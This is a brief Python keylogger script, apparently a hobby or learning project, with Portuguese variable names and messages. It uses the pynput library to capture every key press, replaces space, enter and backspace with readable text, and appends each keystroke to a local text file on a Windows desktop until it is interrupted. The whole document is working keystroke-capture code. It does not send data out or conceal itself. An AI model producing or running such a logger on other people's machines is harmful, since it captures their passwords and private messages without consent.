from pynput.keyboard import Listener
import re
arquivoLog = "C:\\Users\\jessi\\Desktop\\kaylogger\\armazenamento.txt"
def capturar(tecla):
    try:
        tecla = str(tecla)
        tecla = re.sub(r"'", "", tecla)  
        tecla = tecla.replace("Key.space", " ")  
        tecla = tecla.replace("Key.enter", "\n")  
        tecla = tecla.replace("Key.backspace", "[BACKSPACE]")  
        tecla = re.sub(r"Key\.\w+", "", tecla)  

        with open(arquivoLog, "a") as log:
            log.write(tecla) 
    except Exception as e:
        print(f"Erro ao capturar tecla: {e}")
print(" keylogger iniciado. Registro em armazenamento.txt. Pressione Ctrl+C para sair.")
with Listener(on_press=capturar) as listener:
    listener.join()
